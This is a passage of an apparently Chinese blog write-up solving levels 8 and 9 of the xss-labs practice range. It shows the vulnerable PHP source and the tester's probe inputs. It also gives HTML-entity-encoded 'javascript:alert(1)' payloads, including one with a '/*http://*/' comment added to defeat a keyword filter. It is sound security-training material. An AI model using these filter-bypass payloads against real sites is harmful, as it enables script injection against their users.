+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">BR</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;&lt;scr&lt;scrscr_iptipt&gt;ipt&gt;oo_nn\&amp;apos;\&amp;quot&#39;&lt;&gt;&#34;</span><span class="p">&gt;</span>友情链接<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">level8.jpg</span><span class="p">&gt;&lt;/</span><span class="nt">center</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>第1行用了<code>htmlspecialchars()</code>，没法注入payload。</p>
+<p>第4行貌似是将<code>on</code>替换成<code>o_n</code>，构建payload：<code>javascript:alert(1)</code>，查看前端代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">BR</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;javascr_ipt:alert(1)&#34;</span><span class="p">&gt;</span>友情链接<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">level8.jpg</span><span class="p">&gt;&lt;/</span><span class="nt">center</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可见将<code>script</code>替换成<code>scr_ipt</code>。</p>
+<p><em><strong>将payload进行 Unicode编码——<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</code>，过关。</strong></em></p>
+<p>​</p>
+<p>​</p>
+<h2 id="第九关" class="headerLink">
+    <a href="#%e7%ac%ac%e4%b9%9d%e5%85%b3" class="header-mark"></a>第九关</h2><p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64c8c15e1ddac507ccd8f63c.jpg" title="https://pic.imgdb.cn/item/64c8c15e1ddac507ccd8f63c.jpg" data-thumbnail="https://pic.imgdb.cn/item/64c8c15e1ddac507ccd8f63c.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/64c8c15e1ddac507ccd8f63c.jpg"
+            srcset="https://pic.imgdb.cn/item/64c8c15e1ddac507ccd8f63c.jpg, https://pic.imgdb.cn/item/64c8c15e1ddac507ccd8f63c.jpg 1.5x, https://pic.imgdb.cn/item/64c8c15e1ddac507ccd8f63c.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/64c8c15e1ddac507ccd8f63c.jpg">
+    </a></figure></p>
+<h3 id="源码-8" class="headerLink">
+    <a href="#%e6%ba%90%e7%a0%81-8" class="header-mark"></a>源码</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">&lt;?php 
+</span></span><span class="line"><span class="cl">ini_set(&#34;display_errors&#34;, 0);
+</span></span><span class="line"><span class="cl">$str = strtolower($_GET[&#34;keyword&#34;]);
+</span></span><span class="line"><span class="cl">$str2=str_replace(&#34;script&#34;,&#34;scr_ipt&#34;,$str);
+</span></span><span class="line"><span class="cl">$str3=str_replace(&#34;on&#34;,&#34;o_n&#34;,$str2);
+</span></span><span class="line"><span class="cl">$str4=str_replace(&#34;src&#34;,&#34;sr_c&#34;,$str3);
+</span></span><span class="line"><span class="cl">$str5=str_replace(&#34;data&#34;,&#34;da_ta&#34;,$str4);
+</span></span><span class="line"><span class="cl">$str6=str_replace(&#34;href&#34;,&#34;hr_ef&#34;,$str5);
+</span></span><span class="line"><span class="cl">$str7=str_replace(&#39;&#34;&#39;,&#39;&amp;quot&#39;,$str6);
+</span></span><span class="line"><span class="cl">echo &#39;&lt;center&gt;
+</span></span><span class="line"><span class="cl">&lt;form action=level9.php method=GET&gt;
+</span></span><span class="line"><span class="cl">&lt;input name=keyword  value=&#34;&#39;.htmlspecialchars($str).&#39;&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;input type=submit name=submit value=添加友情链接 /&gt;
+</span></span><span class="line"><span class="cl">&lt;/form&gt;
+</span></span><span class="line"><span class="cl">&lt;/center&gt;&#39;;
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">if(false===strpos($str7,&#39;http://&#39;))
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&#34;您的链接不合法？有没有！&#34;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">else
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&#34;&#39;.$str7.&#39;&#34;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;
+</span></span><span class="line"><span class="cl">&lt;?php 
+</span></span><span class="line"><span class="cl">echo &#34;&lt;h3 align=center&gt;payload的长度:&#34;.strlen($str7).&#34;&lt;/h3&gt;&#34;;
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="过程未知源码的情况下-8" class="headerLink">
+    <a href="#%e8%bf%87%e7%a8%8b%e6%9c%aa%e7%9f%a5%e6%ba%90%e7%a0%81%e7%9a%84%e6%83%85%e5%86%b5%e4%b8%8b-8" class="header-mark"></a>过程(未知源码的情况下)</h3><p>表单输入<code>&lt;sCr&lt;scrscRiptipt&gt;ipt&gt;OonN\&amp;apos;\&quot;'&lt;&gt;</code>查看前端代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">keyword</span>  <span class="na">value</span><span class="o">=</span><span class="s">&#34;&amp;lt;scr&amp;lt;scrscriptipt&amp;gt;ipt&amp;gt;oonn\&amp;amp;apos;\&amp;quot;&#39;&amp;lt;&amp;gt;&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">submit</span> <span class="na">name</span><span class="o">=</span><span class="s">submit</span> <span class="na">value</span><span class="o">=</span><span class="s">添加友情链接</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">BR</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;您的链接不合法？有没有！&#34;</span><span class="p">&gt;</span>友情链接<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">level9.png</span><span class="p">&gt;&lt;/</span><span class="nt">center</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>第1个输出点用了<code>htmlspecialchars()</code>，没法构造payload。</p>
+<p>第2个输出点直接把输入的内容替换成报错信息(╬▔皿▔)╯，所以从前端没法猜测过滤机制，要么乱试要么看源码。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="k">false</span><span class="o">===</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$str7</span><span class="p">,</span><span class="s1">&#39;http://&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">echo</span> <span class="s1">&#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&#34;您的链接不合法？有没有！&#34;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">echo</span> <span class="s1">&#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&#34;&#39;</span><span class="o">.</span><span class="nv">$str7</span><span class="o">.</span><span class="s1">&#39;&#34;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>由此可知过滤机制相比于上一关多了个判断输入的内容有没有包含<code>http://</code>。</p>
+<p><em><strong>构建 payload：<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;/*http://*/</code>，过关。</strong></em></p>
+<p>​</p>
+<p>​</p>
+<h2 id="第十关" class="headerLink">
+    <a href="#%e7%ac%ac%e5%8d%81%e5%85%b3" class="header-mark"></a>第十关</h2></div>
+
+        
+
+<div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 0001-01-01</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/xss-labs%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/index.md target="_blank" rel="noopener noreferrer">阅读原始文档</a>
+                    </span></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/xss%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A3%80%E6%B5%8B/" class="prev" rel="prev" title=""><i class="fas fa-angle-left fa-fw"></i></a>
+            <a href="/xshell%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5kali/" class="next" rel="next" title=""><i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer">Lyrio</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp">闽ICP备2023013172号</span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div id="cookieconsent-container"></div><div class="assets"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
+        <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":50,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+</body>
+
+</html>
